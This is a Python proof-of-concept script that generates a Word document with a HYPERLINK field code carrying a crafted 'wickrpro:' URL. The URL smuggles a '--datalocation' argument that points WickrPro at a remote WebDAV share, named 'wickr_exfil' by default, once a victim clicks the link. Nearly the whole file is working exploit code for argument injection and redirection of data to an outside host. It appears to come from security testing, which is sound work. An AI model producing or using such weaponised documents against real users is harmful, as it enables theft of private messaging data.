#!/usr/bin/env python3
"""
Generate a minimal DOCX with a Word HYPERLINK *field-code* carrying a
`wickrpro:` payload. Purpose: test whether Word's HYPERLINK field passes the
URL through ShellExecuteW without percent-encoding (which the browser and
Insert->Link paths do to `\\`, `"`, and space).

If the field-code path passes the URL raw, WickrPro's argv will split and
`--datalocation` becomes a separate argv element -- the W37 verdict's [M]
shape, reached without a browser.

The generated document also carries the raw target URL as plain text so the
tester can Alt+F9 in Word and verify the field instruction string.
"""
import os
import sys
import zipfile
import xml.sax.saxutils as su


def build_docx(target_url: str, link_text: str, out_path: str) -> None:
    # HYPERLINK field-code syntax: the URL is wrapped in double quotes.
    # Inside the quotes, `"` must be escaped as `\"` for Word's field parser.
    # Backslashes are left literal (Word's HYPERLINK field does not treat `\`
    # as an escape character; only the surrounding quotes are special).
    field_instr = f' HYPERLINK "{target_url.replace(chr(34), chr(92) + chr(34))}" '
    instr_escaped = su.escape(field_instr)

    content_types = (
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
        '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
        '<Default Extension="rels" '
        'ContentType="application/vnd.openxmlformats-package.relationships+xml"/>'
        '<Default Extension="xml" ContentType="application/xml"/>'
        '<Override PartName="/word/document.xml" '
        'ContentType="application/vnd.openxmlformats-officedocument.'
        'wordprocessingml.document.main+xml"/>'
        '<Override PartName="/word/styles.xml" '
        'ContentType="application/vnd.openxmlformats-officedocument.'
        'wordprocessingml.styles+xml"/>'
        '</Types>'
    )

    root_rels = (
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
        '<Relationships '
        'xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
        '<Relationship Id="rId1" '
        'Type="http://schemas.openxmlformats.org/officeDocument/2006/'
        'relationships/officeDocument" Target="word/document.xml"/>'
        '</Relationships>'
    )

    doc_rels = (
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
        '<Relationships '
        'xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
        '<Relationship Id="rId1" '
        'Type="http://schemas.openxmlformats.org/officeDocument/2006/'
        'relationships/styles" Target="styles.xml"/>'
        '</Relationships>'
    )

    styles = (
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
        '<w:styles xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">'
        '<w:style w:type="character" w:styleId="Hyperlink">'
        '<w:rPr><w:color w:val="0000FF"/><w:u w:val="single"/></w:rPr>'
        '</w:style></w:styles>'
    )

    document_xml = (
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
        '<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">'
        '<w:body>'
        '<w:p><w:r><w:t xml:space="preserve">W37b field-code hyperlink test. '
        'Step 1: confirm WickrPro is closed. Step 2: click the blue link below. '
        'Step 3: capture the WickrPro.exe CommandLine via '
        'Get-CimInstance Win32_Process.</w:t></w:r></w:p>'
        '<w:p>'
        '<w:r><w:fldChar w:fldCharType="begin" w:dirty="true"/></w:r>'
        f'<w:r><w:instrText xml:space="preserve">{instr_escaped}</w:instrText></w:r>'
        '<w:r><w:fldChar w:fldCharType="separate"/></w:r>'
        '<w:r><w:rPr><w:rStyle w:val="Hyperlink"/></w:rPr>'
        f'<w:t xml:space="preserve">{su.escape(link_text)}</w:t></w:r>'
        '<w:r><w:fldChar w:fldCharType="end"/></w:r>'
        '</w:p>'
        '<w:p/>'
        '<w:p><w:r><w:t xml:space="preserve">Raw target URL (for Alt+F9 inspection):'
        '</w:t></w:r></w:p>'
        f'<w:p><w:r><w:t xml:space="preserve">{su.escape(target_url)}</w:t></w:r></w:p>'
        '<w:sectPr><w:pgSz w:w="12240" w:h="15840"/>'
        '<w:pgMar w:top="1440" w:right="1440" w:bottom="1440" w:left="1440"/>'
        '</w:sectPr>'
        '</w:body>'
        '</w:document>'
    )

    with zipfile.ZipFile(out_path, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr("[Content_Types].xml", content_types)
        z.writestr("_rels/.rels", root_rels)
        z.writestr("word/document.xml", document_xml)
        z.writestr("word/_rels/document.xml.rels", doc_rels)
        z.writestr("word/styles.xml", styles)


def main():
    here = os.path.dirname(os.path.abspath(__file__))
    host = sys.argv[1] if len(sys.argv) > 1 else "192.168.74.148"
    dav_port = sys.argv[2] if len(sys.argv) > 2 else "80"
    share = sys.argv[3] if len(sys.argv) > 3 else "wickr_exfil"
    sub = sys.argv[4] if len(sys.argv) > 4 else "field_test"

    target = (
        f'wickrpro:x" --datalocation \\\\{host}@{dav_port}'
        f'\\DavWWWRoot\\{share}\\{sub}'
    )
    link_text = "Open Wickr (field-code test)"

    out = os.path.join(here, "wickr-field-hyperlink.docx")
    build_docx(target, link_text, out)
    print(f"wrote {out}")
    print(f"target URL: {target}")


if __name__ == "__main__":
    main()
